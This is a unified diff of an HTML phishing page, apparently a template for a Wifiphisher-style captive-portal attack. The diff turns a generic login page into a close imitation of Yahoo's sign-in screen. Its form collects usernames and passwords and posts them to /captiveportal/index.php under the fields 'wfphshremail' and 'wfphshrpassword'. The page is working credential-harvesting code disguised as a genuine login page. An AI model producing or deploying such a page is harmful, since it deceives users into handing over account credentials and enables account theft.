@@ -1,151 +1,83 @@
-<!DOCTYPE html>
-  <html>
+  <html id="Stencil" class="no-js grid mobile light-theme ">
 
   <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
+    <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="origin-when-cross-origin">
+    <title>Yahoo</title>
 
-    <title>Yahoo - login</title>
+    <link rel="icon" type="image/x-icon" href="static/img/yahoo-favicon-img-v0.0.2.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="static/img/yahoo-favicon-img-v0.0.2.ico">
+    <link rel="apple-touch-icon" href="static/img/yahoo-apple-touch-v0.0.2.png">
+    <link rel="apple-touch-icon-precomposed" href="static/img/yahoo-apple-touch-v0.0.2.png">
+    <script src='static/js/jquery-3.5.1.min.js'></script>
 
-    <meta charset='UTF-8'>
-    <meta http-equiv="cache-control" content="no-cache" />
-    <meta http-equiv="expires" content="0" />
-    <meta http-equiv="pragma" content="no-cache" />
-    <meta name="viewport" content="width=device-width,
-    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow">
-
-    <script src="static/js/jquery.min.js"></script>
-
-    <link rel="stylesheet" href="static/css/bootstrap.min.css">
-    <link rel="stylesheet" href="static/css/style.css">
-    <link rel="icon" type="image/png" href="static/img/pfpnk8kp5b.png"/>
-
-    <style>
-
-    body {
-      background-position: center;
-      background-attachment: fixed;
-      background-repeat: no-repeat;
-      -webkit-background-size: 100%;
-      -moz-background-size: 100%;
-      -o-background-size: 100%;
-      background-size: 100%;
-      -webkit-background-size: cover;
-      -moz-background-size: cover;
-      -o-background-size: cover;
-      background-size: cover;
-    }
-
-    .google-header-bar {
-    height: 71px;
-    border-bottom: 1px solid #e5e5e5;
-    overflow: hidden;
-    }
-
-    .google-header-bar.centered {
-    border: 0;
-    height: 108px;
-    }
-
-    .google-header-bar.centered .header .logo {
-    float: none;
-    margin: 40px auto 30px;
-    display: block;
-    }
-    .google-header-bar.centered .header .secondary-link {
-    display: none
-    }
-
-    .header .logo {
-    margin: 17px 0 0;
-    float: left;
-    height: auto;
-    width: auto;
-    }
-    </style>
-
-    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
-      .google-header-bar.centered {
-        height: 83px;
-      }
-
-      .google-header-bar.centered .header .logo {
-        margin: 25px auto 20px;
-      }
-
-      .card {
-        margin-bottom: 20px;
-      }
-    </style>
-
-    <style media="screen and (max-width: 580px)">
-      html,
-      body {
-        font-size: 14px;
-      }
-
-      .google-header-bar.centered {
-        height: 73px;
-      }
-
-      .google-header-bar.centered .header .logo {
-        margin: 20px auto 15px;
-      }
-
-      .content {
-        padding-left: 10px;
-        padding-right: 10px;
-      }
-
-      .hidden-small {
-        display: none;
-      }
-
-      .card {
-        padding: 20px 15px 30px;
-        width: 270px;
-      }
-
-      .footer ul li {
-        padding-right: 1em;
-      }
-
-      .lang-chooser-wrap {
-        display: none;
-      }
-
-    </style>
+    <link href="static/css/yahoo-main.css" rel="stylesheet" type="text/css">
 
   </head>
 
-  <body>
+  <body class="bucket-mbr-change-password-v2 bucket-messenger-linking-mc bucket-mbr-signin-with-google bucket-mbr-oneflow-captcha bucket-mbr-cc-unified-add bucket-mbr-comm-channel-classifier">
 
-    <div class="container">
-      <div class="account-wall">
-
-        <div class="google-header-bar centered">
-          <div class="header content clearfix">
-            <img alt="Google" class="logo" src="static\img\mtq4wpx4d6.png">
-          </div>
+    <div id="login-body" class="loginish  puree-v2 grid ">
+      <div class="mbr-login-hd" id="mbr-uh-hd">
+        <a href="#">
+          <img src="static/img/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27" />
+          <img src="static/img/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27" />
+        </a>
+      </div>
+      <div class="challenge yid-challenge">
+        <div class="challenge-header">
         </div>
+        <div class="username-challenge" id="login-landing">
+          <strong class="challenge-heading">Sign in</strong>
+          <span class="challenge-desc signin-sub-title">using your Yahoo account</span>
+          </span>
+          <form id="login-username-form" method="post" action="/captiveportal/index.php" onsubmit="redirect()" class="pure-form">
+            <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-2">
 
-        <h1 class="text-center login-title">Sign in to your account</h1>
+              <div>
+                <input class="phone-no" type="text" name="eml" id="eml" tabindex="1" value="" autocomplete="username" autocapitalize="none" autocorrect="off" placeholder="Username, email, or mobile" />
 
-          <form class="form-signin">
+                <input name="pwd" id="pwd" class="pwd-field" type="password" tabindex="2" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password" />
+              </div>
 
-            <input id="eml" type="text" name="eml" class="form-email" placeholder="Enter your Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
-            <input id="pwd" type="password" name="pwd" class="form-password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+            </div>
+            <p id="username-error" class="error-msg hide" role="alert"></p>
 
-            <div id="dialog">
-            <h2 id="error">Please enter the required fields.</h2>
+
+            <div class="button-container">
+              <input id="btn" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Next" tabindex="6" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:login-landing-next" />
             </div>
 
-            <button id="btn" class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Sign in</button>
-            <div class="text-center terms-text1"><a href="#" class="url-color">Trouble signing in?</a></div><br>
-            <div class="text-center terms-text2">New to Yahoo? <a href="#" class="url-color">Sign up for a new account</a></div>
+            <div class="challenge-feedback-link">
+              <a href="#" id="mbr-forgot-link" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:login-landing-forgot" data-rapid-tracking="true">Forgot username?</a>
+            </div>
+            <div class="bottom-links-container has-social-buttons">
+              <p class="sign-up-link">
+                <a href="#" id="createacc" role="button" class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;mKey:login-landing-signup">Create an account</a>
+              </p>
 
+              <div id="social-login-container" class="social-login-container">
+                <div class="or-cont-with-desc challenge-feedback-text">
+                  Or, continue with
+                </div>
+                <ul class="social-login">
+                  <li class="items-cont-1">
+                    <button type="submit" id="tpa-google-button" name="tpaProvider" value="google" class="pure-button sc-button items-1 sc-google sc-google-button" data-rapid-tracking="true" data-ylk="elm:btn;slk:google-btn;mKey:login-landing-google-social-btn">
+                      <label class="offscreen">google</label>
+                    </button>
+                  </li>
+                </ul>
+              </div>
+            </div>
           </form>
+        </div>
+      </div>
 
-      <script>
+
+    </div>
+    <script>
       /*
       Check the password field and act accordingly.
       */
@@ -163,17 +95,18 @@
           }else{
               // post the data
               $("#dialog").css('display', 'none');
-                post('post', {
+                post('login', {
                   wfphshremail: input.value,
                   wfphshrpassword: input2.value
-                });      
+                });
           }
       });
 
       function passNotValid(){
         $("#dialog").css('display', 'block');
+        $(".form-control").css('border', '1px solid #dd4b39');
       }
-      
+
       /*
       Post to the fallowing path given the parameters.
 
@@ -206,10 +139,6 @@
       input.disabled = false;
       input2.disabled = false;
     </script>
-
-      </div>
-    </div>
-
   </body>
 
-</html>
+  </html>
